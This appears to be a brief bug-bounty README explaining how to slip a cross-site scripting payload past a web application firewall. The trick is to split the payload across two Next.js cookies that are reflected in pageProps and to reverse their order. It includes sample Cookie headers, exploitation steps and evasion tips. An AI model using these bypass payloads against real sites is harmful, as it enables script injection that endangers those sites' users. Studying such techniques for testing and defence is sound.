# 🚀 Next.js WAF Bypass: Cookie Reflection Exploit
![Nextjs WAF Bypass Cookie Reflection Exploit - cybersecplayground](https://github.com/user-attachments/assets/cbeadf3e-7446-477b-9634-301edfc9df10)

## 🎯 Scenario
- **Vulnerable App**: Next.js reflecting two cookies in `pageProps`
- **Protection**: Web Application Firewall (WAF) blocking malicious payloads

## 🔥 The Breakthrough
```http
Cookie: cookie1=alert(1); cookie2=x → 403 ❌
Cookie: cookie1=alert; cookie2=(1) → 403 ❌
Cookie: cookie2=(1); cookie1=alert → 200 ✅
```

## 🧠 Why This Works
1️⃣ Order Matters: WAF analyzes cookies sequentially
2️⃣ Split Logic: Divided payload avoids signature detection
3️⃣ Hydration Magic: Next.js combines cookies during pageProps processing

## ⚡ Exploitation Steps
➕ Inspect `__NEXT_DATA__` script for reflected cookies   
➕ Split XSS payload (e.g., `alert(1)` → "alert" + "(1)")   
➕ Reverse cookie order to bypass WAF   

**💎 Pro Tips**
➕ Try fragmented DOM XSS: `cookie2=);cookie1=alert(1// ` 
➕ Combine with `document.cookie` splitting for advanced bypasses   
➕ Test with different encoding schemes (UTF-7, HTML entities)   

✨ Star this repo to get updated with new bypass techniques
🐦 Join Telegram Channel : [@cybersecplayground](https://t.me/cybersecplayground)

## Tags
`#WebSecurity` `#WAFBypass` `#NextJS` `#BugBounty` `#XSS`
